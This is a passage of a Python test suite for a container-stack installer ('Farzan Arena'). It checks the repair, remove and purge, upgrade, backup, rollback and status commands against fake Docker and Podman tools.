        self.assertEqual(r.returncode, 0, self.output(r))
        out = r.stdout
        self.assertIn("done   restored config/added.yml (it was missing)", out)
        self.assertIn("done   put back config/valkey.conf", out)
        self.assertEqual((deploy / "config" / "valkey.conf").read_text(), "model_list: []\n")
        self.assertEqual([p.read_text() for p in (deploy / "config").glob("valkey.conf.changed-*")], ["changed by hand\n"])
        self.assertIn("missing or not the release's: arena-web:9.9.9", out)
        self.assertIn("loaded arena-web:9.9.9", out)
        self.assertIn("code-intel (code-intel): exited", out)
        # Valkey reads the file put back: it starts again, on the shipped copy.
        self.assertIn("they read a file put back, so they start again: valkey", out)
        self.assertNotEqual(next(c for c in self.containers() if c["service"] == "valkey")["id"], valkey)
        self.assertIn("Repaired:", out)
        self.assertEqual({c["state"] for c in self.containers()}, {"running"})
        # Again: nothing to do.
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("every file of 9.9.9 is there, as it was shipped", r.stdout)

    def test_A_helper_a_stopped_run_left_is_removed_by_the_next_and_one_at_work_is_left_alone(self):
        self.install()
        store = self.r.store()
        helper = store["images"]["python:3.13-slim"]
        # Ctrl-C between a container's create and its start leaves it, --rm or not.
        leftovers = [
            {"id": "c0ffee01", "name": "beautiful_cannon", "state": "created", "image_id": helper, "image_ref": "python:3.13-slim", "labels": ["arena.helper=1"],
             "project": "", "service": ""},
            {"id": "c0ffee02", "name": "older_one", "state": "created", "image_id": helper, "image_ref": "python:3.13-slim", "labels": [], "project": "", "service": ""},
            {"id": "c0ffee03", "name": "stopped_one", "state": "exited", "image_id": helper, "image_ref": "python:3.13-slim", "labels": ["arena.helper=1"],
             "project": "", "service": ""},
        ]
        at_work = {"id": "c0ffee04", "name": "a_backup", "state": "running", "image_id": helper, "image_ref": "python:3.13-slim", "labels": ["arena.helper=1"],
                   "project": "", "service": ""}
        store["containers"] += leftovers + [at_work]
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        left = {c["id"] for c in self.containers()}
        self.assertTrue(left.isdisjoint({"c0ffee01", "c0ffee02", "c0ffee03"}), left)
        self.assertIn("c0ffee04", left)
        # Its own throwaway containers carry the label.
        helpers = [a for a in self.r.s.calls() if a[1:2] == ["run"] and "python:3.13-slim" in a]
        self.assertTrue(helpers)
        self.assertTrue(all("arena.helper=1" in a for a in helpers), [a[:8] for a in helpers if "arena.helper=1" not in a])

    def test_Repair_gives_a_volume_back_to_its_service(self):
        self.install()
        store = self.r.store()
        store["volumes"]["arena_code-intel"] = {"labels": []}
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s", extra={"FAKE_OWNER_code-intel": "0:0"})
        self.assertIn("the code-intel volume was 0:0's: now 10001:10001's", r.stdout)
        self.assertTrue(any(c[-3:] == ["chown", "-R", "10001:10001"] or "10001:10001" in c for c in self.r.calls() if "chown" in c))
        # A finding, and its service starts again to write there.
        self.assertIn("recreated: code-intel", r.stdout)
        self.assertIn("Repaired: 1 finding(s)", r.stdout)

    def test_A_volume_rootless_Podman_makes_roots_is_given_to_its_service_on_install(self):
        r = self.install(extra_env={"FAKE_OWNER_code-intel": "0:0"})
        out = r.stdout
        # Not there before the stack starts: put right once it is, and the service restarted.
        self.assertIn("permissions, now that every volume exists", out)
        self.assertIn("the code-intel volume was 0:0's: now 10001:10001's", out)
        self.assertIn("restarted: code-intel", out)
        self.assertTrue(self.r.s.called("compose", "restart", "code-intel"))

    # ----------------------------------------------------------------- remove

    def test_Remove_keeps_the_data_and_what_was_here_before(self):
        self.install()
        store = self.r.store()
        store["volumes"]["arena_postgres"] = {"labels": ["com.docker.compose.project=arena"]}
        # An image's VOLUME (SearXNG's cache): an unnamed volume of one container, and another's.
        anon, other = "a" * 64, "b" * 64
        store["volumes"][anon] = {"labels": []}
        store["volumes"][other] = {"labels": []}
        next(c for c in store["containers"] if c["service"] == "web")["anon"] = anon
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("remove", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 0, self.output(r))
        images = self.r.store()["images"]
        self.assertEqual(self.containers(), [])
        for gone in ("arena-app:9.9.9", "arena-app:latest", "arena-web:9.9.9"):
            self.assertNotIn(gone, images)
        for kept in ("traefik:v3.6.7", "python:3.13-slim"):
            self.assertIn(kept, images)
        self.assertIn("kept traefik:v3.6.7: on this host before Farzan Arena was installed", r.stdout)
        self.assertIn("arena_postgres", self.r.store()["volumes"])
        self.assertNotIn(anon, self.r.store()["volumes"])
        self.assertIn(other, self.r.store()["volumes"])
        self.assertIn("1 unnamed volume(s) of those containers", r.stdout)
        self.assertTrue((self.dir / "deploy" / ".env").is_file())
        r = self.r.run("remove", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 0, self.output(r))
        # And back: install over it brings it up on the same data, and a file changed meanwhile
        # stays as it was changed (the release ships it as it was installed).
        (self.dir / "deploy" / "config" / "valkey.conf").write_text("changed while it was removed\n")
        r = self.install()
        self.assertIn("kept config/valkey.conf as it was changed here", r.stdout)
        self.assertEqual((self.dir / "deploy" / "config" / "valkey.conf").read_text(), "changed while it was removed\n")
        self.assertFalse((self.dir / "deploy" / "config" / "valkey.conf.before-9.9.9").exists())
        self.assertIn("kept as you changed them (9.9.9 ships them as they were): config/valkey.conf\n", r.stdout)

    def test_Purge_asks_for_the_word_and_offers_a_last_backup(self):
        self.install()
        store = self.r.store()
        store["volumes"]["arena_postgres"] = {"labels": ["com.docker.compose.project=arena"]}
        self.r.state.write_text(json.dumps(store))
        for args, message in [
            ([], "unattended, it needs --confirm PURGE"),
            (["--confirm", "purge"], "--confirm takes the word PURGE"),
            (["--confirm", "PURGE", "--final-backup", str(self.dir / "inside")], "must go outside"),
        ]:
            r = self.r.run("remove", "--dir", str(self.dir), "--yes", "--purge", *args)
            self.assertEqual(r.returncode, 3, (args, self.output(r)))
            self.assertIn(message, r.stderr, args)
            self.assertTrue((self.dir / "deploy" / ".env").is_file())
            self.assertIn("arena_postgres", self.r.store()["volumes"])
            self.assertTrue(self.containers())
        final = self.r.s.dir / "final"
        r = self.r.run("remove", "--dir", str(self.dir), "--yes", "--purge", "--confirm", "PURGE", "--final-backup", str(final))
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertEqual(len(list(final.glob("20*"))), 1)
        self.assertNotIn("arena_postgres", self.r.store()["volumes"])
        self.assertFalse((self.dir / "deploy").exists())
        self.assertTrue(list((self.dir / ".arena-install" / "logs").glob("remove-*.log")))
        self.assertIn("traefik:v3.6.7", self.r.store()["images"])

    def test_Purge_keeps_the_files_of_a_folder_it_did_not_make(self):
        deploy = self.old_install()
        r = self.r.run("remove", "--dir", str(self.dir), "--yes", "--purge", "--confirm", "PURGE")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertFalse((deploy / ".env").exists())
        self.assertFalse((deploy / "certs" / "tls.key").exists())
        self.assertTrue((deploy / "docker-compose.yml").is_file())
        self.assertTrue((deploy / "certs" / "README.md").is_file())

    def test_Remove_leaves_a_stack_started_from_another_folder(self):
        self.install()
        store = self.r.store()
        for c in store["containers"]:
            c["workdir"] = "/somewhere/else/deploy"
        self.r.state.write_text(json.dumps(store))
        r = self.r.run("remove", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("was started from /somewhere/else/deploy", r.stderr)
        self.assertEqual(len(self.containers()), len(SERVICES.split()))


    # ------------------------------------------------- the embedding model

    def test_Without_its_model_the_embedding_server_is_named_and_not_waited_for(self):
        """On Docker the llama.cpp image's health check fails until the file is there (FAKE_WAITS_FOR)."""
        r = self.install()
        out = r.stdout
        self.assertIn(f"the embedding server waits for {EMBED} in {self.dir}/deploy/models, which the bundle does not carry", out)
        self.assertIn(f"ok     healthy, waiting for models: {len(SERVICES.split()) - 1} of {len(SERVICES.split())} services up, and embed running, waiting for its model", out)
        self.assertIn(f"waiting for models: embed needs {EMBED} in {self.dir}/deploy/models, which nothing here can fetch: copy the file there and it starts by itself", out)
        self.assertIn("Arena 9.9.9 runs:", out)
        self.assertIn("Installed: healthy, waiting for models (embed; above).", out)
        self.assertIn(f"the embedding server waits for its model: bring {EMBED} into", out)
        # status names it and is not failed by it; repair does not recreate it (nothing would change).
        r = self.r.run("status", "--dir", str(self.dir))
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn(f"(waits for {EMBED} in MODELS_DIR)", r.stdout)
        embed = next(c for c in self.containers() if c["service"] == "embed")["id"]
        r = self.r.run("repair", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("embed waits for its model", r.stdout)
        self.assertEqual(next(c for c in self.containers() if c["service"] == "embed")["id"], embed)
        # The file brought in: healthy by itself.
        model = self.dir / "deploy" / "models" / EMBED
        model.parent.mkdir(parents=True, exist_ok=True)
        model.write_text("an embedding model\n")
        r = self.r.run("status", "--dir", str(self.dir))
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertNotIn("waits for", r.stdout)
        self.assertRegex(r.stdout, r"embed +running +healthy")

    # ------------------------------------------------------------ no curl

    def no_curl_path(self) -> str:
        """A PATH with the fakes and the system's commands, but no curl at all."""
        base = self.r.s.dir / "nocurl"
        if not base.exists():
            (base / "bin").mkdir(parents=True)
            (base / "sys").mkdir()
            for f in self.r.s.bin.iterdir():
                if f.name != "curl":
                    os.symlink(f, base / "bin" / f.name)
            for d in ("/usr/local/bin", "/usr/bin", "/bin"):
                for f in Path(d).iterdir() if Path(d).is_dir() else []:
                    target = base / "sys" / f.name
                    if f.name != "curl" and not target.is_symlink():
                        os.symlink(f, target)
        return f"{base / 'bin'}:{base / 'sys'}"

    def test_Without_curl_the_app_and_CodeIntel_are_asked_from_the_stacks_network(self):
        deploy = self.old_install()
        # No VERSION and no record: the version comes from the running app, asked without curl.
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s", extra={"PATH": self.no_curl_path()})
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("curl is not installed: the app and code-intel are asked their version from a helper container", r.stdout)
        self.assertIn("from 5.2.0 (the running app (/api/info)) to 9.9.9", r.stdout)
        self.assertIn("ok     app: 9.9.9 (its own /api/info)", r.stdout)
        self.assertIn("ok     code-intel: 9.9.9 (its own metrics)", r.stdout)
        asks = [c for c in self.r.calls() if c[1:2] == ["run"] and "arena_default" in c]
        self.assertTrue(asks)
        self.assertFalse([c for c in self.r.calls() if c[0] == "curl"])
        for c in asks:
            self.assertEqual(c[c.index("--pull") + 1], "never")
            # The admin token goes in the environment (-e ASK_TOKEN), never on a command line.
            self.assertNotIn("old-argus", " ".join(c))
        self.assertIn("ASK_TOKEN", [c for c in asks if c[-1].endswith("/admin/metrics")][0])
        self.assertTrue((deploy / ".env").read_text().startswith(OLD_ENV.replace("ARGUS_KEY=", "CODE_INTEL_KEY=")))

    # ------------------------------------------- the backup and the rollback

    def test_The_images_load_while_5_2_0_runs_and_the_backup_is_taken_with_it_stopped(self):
        """The backup is the data the new release starts from: nothing writes after it."""
        self.old_install(version_file=True)
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 0, self.output(r))
        calls = self.r.calls()

        def first(pred) -> int:
            return next(i for i, c in enumerate(calls) if pred(c))
        kept = first(lambda c: c[1:2] == ["tag"] and any(a.startswith("arena-rollback:") for a in c))
        load = first(lambda c: c[1:2] == ["load"])
        stop = first(lambda c: c[1:3] == ["compose", "stop"])
        dump = first(lambda c: "pg_dumpall" in c)
        up = max(i for i, c in enumerate(calls) if c[1:2] == ["compose"] and "up" in c)
        self.assertLess(kept, load)
        self.assertLess(load, stop)
        self.assertLess(stop, dump)
        self.assertLess(dump, up)
        self.assertNotIn("postgres", calls[stop])
        self.assertIn("app", calls[stop])
        self.assertIn("stopped for the backup: every service but postgres", r.stdout)
        self.assertIn("a rollback (by itself on a failure, or upgrade --rollback later) puts back 5.2.0's images, the files this upgrade changes and the data of this backup", r.stdout)

    def test_A_backup_that_fails_leaves_5_2_0_running_on_its_data(self):
        deploy = self.old_install(version_file=True)
        old_app = next(c for c in self.containers() if c["service"] == "app")["image_id"]
        (deploy / "backups").write_text("not a folder\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 4, self.output(r))
        self.assertIn("the backup failed", r.stdout)
        self.assertIn("Rolled back: 5.2.0 runs again; its data was not touched (the new release never started)", r.stdout)
        # Never taken down: the services stopped for the backup start again, on 5.2.0's images.
        self.assertFalse([c for c in self.r.calls() if c[1:3] == ["compose", "down"]])
        self.assertEqual({c["state"] for c in self.containers()}, {"running"})
        self.assertEqual(next(c for c in self.containers() if c["service"] == "app")["image_id"], old_app)
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_OLD)
        self.assertFalse((self.dir / ".arena-install" / "upgrade").exists())

    def test_A_rollback_that_cannot_keep_the_data_restores_nothing_and_is_finished_when_run_again(self):
        deploy = self.old_install(version_file=True)
        old_app = next(c for c in self.containers() if c["service"] == "app")["image_id"]
        snap = self.dir / ".arena-install" / "rollback" / "5.2.0"
        snap.mkdir(parents=True)
        # The backup of the data as it is cannot be made (as on a full disk).
        (snap / "data-before-rollback").write_text("in the way\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={"FAKE_UNHEALTHY": "arena-app:9.9.9"})
        self.assertEqual(r.returncode, 5, self.output(r))
        self.assertIn("nothing is put back or restored over the data, which would be lost", r.stdout)
        self.assertFalse([c for c in self.r.calls() if "find /target -mindepth 1 -delete" in " ".join(c)])
        # Not a file put back either: the new release's files, with the data they open, as they were.
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_NEW)
        # The steps by hand: the rollback's own backup.sh, which takes --deploy (5.2.0's put back does not).
        self.assertTrue((snap / "backup.sh").is_file())
        self.assertIn(f"bash {snap}/backup.sh --deploy {deploy} --restore --from {deploy}/backups/", r.stdout)
        self.assertIn("docker compose -p arena down", r.stdout)
        self.assertIn("run the same upgrade again: it finishes", r.stdout)
        self.assertIn("rolling-back=1\n", (self.dir / ".arena-install" / "upgrade").read_text())
        self.assertIn("a rollback to 5.2.0 was cut off: run upgrade again to finish it", self.r.run("status", "--dir", str(self.dir)).stdout)
        r = self.r.run("repair", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 3, self.output(r))
        # Run again, the cause gone and the release now healthy: the rollback is finished, not the upgrade.
        (snap / "data-before-rollback").unlink()
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "5s")
        self.assertEqual(r.returncode, 4, self.output(r))
        self.assertIn("A rollback of " + str(self.dir) + " to 5.2.0 was cut off: it is finished now", r.stdout)
        self.assertIn("Rolled back: 5.2.0 runs again, with the data of", r.stdout)
        self.assertEqual((deploy / "docker-compose.yml").read_text(), COMPOSE_OLD)
        self.assertEqual(next(c for c in self.containers() if c["service"] == "app")["image_id"], old_app)
        self.assertTrue([c for c in self.r.calls() if "find /target -mindepth 1 -delete" in " ".join(c)])
        self.assertTrue(list((snap / "data-before-rollback").glob("20*")))
        self.assertFalse((self.dir / ".arena-install" / "upgrade").exists())
        self.assertEqual((self.dir / "VERSION").read_text(), "5.2.0\n")

    def test_On_Podman_the_steps_by_hand_name_its_compose_files(self):
        podman = {"FAKE_STATE_ENGINE": "podman"}
        deploy = self.old_install(version_file=True, running=False)
        subprocess.run(["podman", "compose", "-f", "docker-compose.yml", "-f", "podman.yml", "up", "-d"], cwd=deploy,
                       env=self.r.env(podman), check=True)
        snap = self.dir / ".arena-install" / "rollback" / "5.2.0"
        snap.mkdir(parents=True)
        (snap / "data-before-rollback").write_text("in the way\n")
        r = self.r.run("upgrade", "--dir", str(self.dir), "--yes", "--timeout", "3s", extra={**podman, "FAKE_UNHEALTHY": "arena-app:9.9.9"})
        self.assertEqual(r.returncode, 5, self.output(r))
        self.assertIn("podman compose -p arena -f docker-compose.yml -f podman.yml down", r.stdout)
        self.assertIn(f"COMPOSE_PROJECT_NAME=arena COMPOSE_FILE=docker-compose.yml:podman.yml bash {snap}/backup.sh --deploy {deploy} --podman --restore", r.stdout)
        # 5.2.0's files and .env by hand, never over the certificates and the override.
        self.assertIn(f"tar -xpf {snap}/deploy.tar -C {deploy} --exclude=./certs --exclude=./docker-compose.override.yml", r.stdout)

    # ------------------------------------------------ remove and the helper

    def test_A_plain_remove_keeps_the_helper_that_backs_up_the_data_it_keeps(self):
        store = self.r.store()
        del store["images"]["python:3.13-slim"]
        self.r.state.write_text(json.dumps(store))
        self.install()
        rows = [line.split("\t") for line in (self.dir / ".arena-install" / "IMAGES").read_text().splitlines()]
        self.assertEqual([x[2] for x in rows if x[0] == "python:3.13-slim"], ["0"])
        r = self.r.run("remove", "--dir", str(self.dir), "--yes")
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("python:3.13-slim", self.r.store()["images"])
        self.assertIn("kept python:3.13-slim: backups read the kept volumes with it (remove --purge takes it)", r.stdout)
        # Later, a last backup before the purge: the helper is here, and is never pulled.
        final = self.r.s.dir / "final"
        r = self.r.run("remove", "--dir", str(self.dir), "--yes", "--purge", "--confirm", "PURGE", "--final-backup", str(final))
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertEqual(len(list(final.glob("20*"))), 1)
        self.assertNotIn("python:3.13-slim", self.r.store()["images"])
        runs = [c for c in self.r.calls() if c[1:2] == ["run"]]
        self.assertTrue(runs)
        for c in runs:
            self.assertEqual(c[c.index("--pull") + 1], "never", c)

    def old_backup_sh(self) -> str:
        """5.2.0's backup.sh, from its tag: it takes neither --deploy nor --podman."""
        r = subprocess.run(["git", "-C", str(REPO), "show", "v5.2.0:deploy/scripts/backup.sh"], capture_output=True, text=True)
        if r.returncode != 0:
            self.skipTest("no v5.2.0 tag in this clone (git fetch --tags)")
        self.assertNotIn("--deploy)", r.stdout)
        return r.stdout

    def test_A_last_backup_of_a_5_2_0_installation_is_taken_with_a_backup_sh_that_can(self):
        old = self.old_backup_sh()
        deploy = self.old_install(version_file=True)
        (deploy / "scripts" / "backup.sh").write_text(old)
        final = self.r.s.dir / "final"
        # From the bundle: its backup.sh.
        r = self.r.run("remove", "--dir", str(self.dir), "--yes", "--purge", "--confirm", "PURGE", "--final-backup", str(final))
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertEqual(len(list(final.glob("20*"))), 1)
        self.assertFalse((deploy / ".env").exists())
        # Without a bundle, on Docker: 5.2.0's, as it is called (no --deploy).
        shutil.rmtree(self.dir)
        shutil.rmtree(final)
        self.r.state.write_text(json.dumps(self.pristine))
        deploy = self.old_install(version_file=True)
        (deploy / "scripts" / "backup.sh").write_text(old)
        r = subprocess.run(["bash", str(deploy / "scripts" / "installer.sh"), "remove", "--dir", str(self.dir), "--yes", "--purge",
                            "--confirm", "PURGE", "--final-backup", str(final)], env=self.r.env(), capture_output=True, text=True,
                           stdin=subprocess.DEVNULL)
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertEqual(len(list(final.glob("20*"))), 1)
        self.assertNotIn("unknown option", self.output(r))
        # Without a bundle, on Podman: 5.2.0's cannot; refused before anything is removed.
        shutil.rmtree(self.dir)
        shutil.rmtree(final)
        self.r.state.write_text(json.dumps(self.pristine))
        podman = {"FAKE_STATE_ENGINE": "podman"}
        deploy = self.old_install(version_file=True, running=False)
        (deploy / "scripts" / "backup.sh").write_text(old)
        subprocess.run(["podman", "compose", "-f", "docker-compose.yml", "-f", "podman.yml", "up", "-d"], cwd=deploy,
                       env=self.r.env(podman), check=True)
        r = subprocess.run(["bash", str(deploy / "scripts" / "installer.sh"), "remove", "--dir", str(self.dir), "--yes", "--purge",
                            "--confirm", "PURGE", "--final-backup", str(final)], env=self.r.env(podman), capture_output=True, text=True,
                           stdin=subprocess.DEVNULL)
        self.assertEqual(r.returncode, 3, self.output(r))
        self.assertIn("backs up only with Docker: run remove from the release's bundle", r.stderr)
        self.assertTrue((deploy / ".env").is_file())
        self.assertTrue(self.containers())

    # ----------------------------------------------------------------- status

    def test_Status_says_what_runs_and_what_does_not(self):
        self.install()
        r = self.r.run("status", "--dir", str(self.dir), via_run=True)
        self.assertEqual(r.returncode, 0, self.output(r))
        self.assertIn("installed: 9.9.9 (this installer's record)", r.stdout)
        self.assertIn("installed: 9.9.9", "".join(p.read_text() for p in (self.dir / ".arena-install" / "logs").glob("status-*.log")))
        self.assertIn("(says 9.9.9)", r.stdout)
        self.assertIn("Every service is up.", r.stdout)
        store = self.r.store()
        next(c for c in store["containers"] if c["service"] == "web")["health"] = "unhealthy"
        self.r.state.write_text(json.dumps(store))
        r = subprocess.run(["bash", str(self.dir / "deploy" / "scripts" / "installer.sh"), "status"], env=self.r.env(), capture_output=True, text=True)
        self.assertEqual(r.returncode, 1, self.output(r))
        self.assertIn("1 service(s) not up or not healthy", r.stdout)


class EmbedModelTests(unittest.TestCase):
    """A bundle made where the embedding model is: it carries it, and a fresh install is healthy, embed too."""

    @classmethod
    def setUpClass(cls):
        cls.r = Release(embed_model=True)

    @classmethod
    def tearDownClass(cls):
        cls.r.s.cleanup()

    def test_The_bundle_carries_the_embedding_model_and_a_fresh_install_runs_it(self):
        self.assertEqual(self.r.made.returncode, 0, self.r.made.stdout + self.r.made.stderr)
        b = self.r.unpack()
        self.assertIn("embedding: packed\n", (b / "MANIFEST").read_text())
        self.assertEqual((b / "models" / "library" / EMBED).read_text(), "an embedding model\n")
        self.assertIn(f"  models/library/{EMBED}\n", (b / "SHA256SUMS").read_text())
        # Not a model bundle (no --models): no chat model is offered as MODEL.
        self.assertNotIn("models: copied", (b / "MANIFEST").read_text())
        target = self.r.s.dir / "fresh"
        token = self.r.s.dir / "gitlab-token"
        token.write_text("glpat-a-token-for-the-test\n")
        r = self.r.run("install", "--dir", str(target), "--docker", "--yes", "--cpu-only", "--skip-requirements", "--timeout", "5s",
                       "--domain", "arena.test", "--https-port", "18443", "--http-port", "18080",
                       "--gitlab-url", "https://gitlab.test", "--gitlab-token-file", str(token))
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertIn(f"  model {EMBED}", r.stdout)
        self.assertEqual((target / "deploy" / "models" / EMBED).read_text(), "an embedding model\n")
        self.assertIn(f"ok     {len(SERVICES.split())} of {len(SERVICES.split())} services up", r.stdout)
        self.assertNotIn("waits for", r.stdout)
        embed = next(c for c in self.r.store()["containers"] if c["service"] == "embed")
        self.assertTrue(embed["waits_for"].endswith(EMBED))
        self.assertIn("\nMODEL=\n", (target / "deploy" / ".env").read_text())


class KnownTests(unittest.TestCase):
    def test_Without_the_tag_of_5_2_0_no_bundle_is_made(self):
        r = Release(tag=False)
        try:
            self.assertEqual(r.made.returncode, 1, r.made.stdout + r.made.stderr)
            self.assertIn("no git tag of 5.2.0", r.made.stderr)
            self.assertIn("git fetch --tags", r.made.stderr)
            self.assertFalse(list(r.dist.glob("*.run")))
            self.assertFalse([c for c in r.calls() if c[1:2] == ["save"]])
        finally:
            r.s.cleanup()


if __name__ == "__main__":
    unittest.main()
